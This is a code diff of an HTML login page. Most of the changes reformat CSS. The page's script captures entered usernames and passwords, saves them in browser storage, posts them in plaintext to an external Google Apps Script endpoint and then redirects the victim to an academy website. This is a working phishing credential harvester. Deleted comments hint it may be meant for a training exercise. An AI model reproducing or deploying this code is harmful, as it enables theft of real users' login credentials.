@@ -12,18 +12,83 @@
   --card-bg:#ffffff;
   --shadow:0 8px 28px rgba(15,23,42,0.06);
 }
-html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#222}
-.page{min-height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:26px;padding:48px 20px;}
-.card{width:720px;max-width:95%;background:var(--card-bg);border-radius:6px;box-shadow:var(--shadow);padding:46px 64px;display:flex;align-items:center;justify-content:center;}
-.inner{width:420px;text-align:center;}
-.logo{width:220px;height:auto;margin:8px auto 18px;display:block;object-fit:contain;}
-h1.title{margin:0;font-size:20px;color:#2b5e90;font-weight:600;}
-.form-box{margin-top:22px;border-left:1px solid rgba(0,0,0,0.03);border-right:1px solid rgba(0,0,0,0.03);padding:28px 34px;border-radius:2px;background:linear-gradient(180deg,#ffffff,#fbfcfd);}
-.label{font-size:18px;color:#305b99;margin-bottom:14px;font-weight:600;}
-.field{display:block;width:100%;padding:14px 16px;border-radius:10px;border:1px solid #eceff2;margin-bottom:18px;background:#f8fafb;font-size:15px;}
-.login-btn{display:inline-block;width:100%;padding:12px 18px;background:var(--green);color:white;border-radius:8px;border:0;font-weight:600;cursor:pointer;margin-top:8px;}
-.footer{margin-top:28px;color:#666;font-weight:500;font-size:15px;}
-@media(max-width:640px){.card{padding:28px 18px}.inner{width:100%}.logo{width:180px}}
+html,body{
+  height:100%;
+  margin:0;
+  font-family:Inter,system-ui,Arial,sans-serif;
+  background:var(--bg);
+  color:#222;
+}
+.page{
+  min-height:100%;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:26px;
+  padding:48px 20px;
+}
+.card{
+  width:720px;
+  max-width:95%;
+  background:var(--card-bg);
+  border-radius:6px;
+  box-shadow:var(--shadow);
+  padding:46px 64px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.inner{
+  width:420px;
+  text-align:center;
+}
+.logo{
+  width:220px;
+  height:auto;
+  margin:8px auto 18px;
+  display:block;
+  object-fit:contain;
+}
+.label{
+  font-size:18px;
+  color:#305b99;
+  margin-bottom:14px;
+  font-weight:600;
+}
+.field{
+  display:block;
+  width:100%;
+  padding:14px 16px;
+  border-radius:10px;
+  border:1px solid #eceff2;
+  margin-bottom:18px;
+  background:#f8fafb;
+  font-size:15px;
+}
+.login-btn{
+  display:inline-block;
+  width:100%;
+  padding:12px 18px;
+  background:var(--green);
+  color:white;
+  border-radius:8px;
+  border:0;
+  font-weight:600;
+  cursor:pointer;
+  margin-top:8px;
+}
+.footer{
+  margin-top:28px;
+  color:#666;
+  font-weight:500;
+  font-size:15px;
+}
+@media(max-width:640px){
+  .card{padding:28px 18px;}
+  .inner{width:100%;}
+  .logo{width:180px;}
+}
 </style>
 </head>
 <body>
@@ -41,28 +106,21 @@ h1.title{margin:0;font-size:20px;color:#2b5e90;font-weight:600;}
     </div>
   </section>
 </main>
-
 <script>
 const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwYOsSonTJ4W0Aduq-IygbHGUcm6cH-c-A-W5JNKVQjOBVPrUtbpgi4X9hpfslX586G/exec";
-
 document.getElementById("loginForm").addEventListener("submit", function(e){
   e.preventDefault();
   const user = document.getElementById("username").value.trim();
   const pass = document.getElementById("password").value.trim();
-
-  // Save credentials locally for trainer review
   const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
   attempts.push({username: user, password: pass, time: new Date().toLocaleString()});
   localStorage.setItem("loginAttempts", JSON.stringify(attempts));
-
-  // Send to Google Sheet
   const formData = new FormData();
   formData.append("username", user);
   formData.append("password", pass);
   formData.append("role", "participant");
-
-  fetch(GOOGLE_SCRIPT_URL, {method:"POST", mode:"no-cors", body:formData})
-    // Redirect immediately
+  fetch(GOOGLE_SCRIPT_URL, {method:"POST", mode:"no-cors", body:formData});
+ // Redirect immediately
   window.location.href = "https://mpesafoundationacademy.ac.ke/";
 });
 </script>
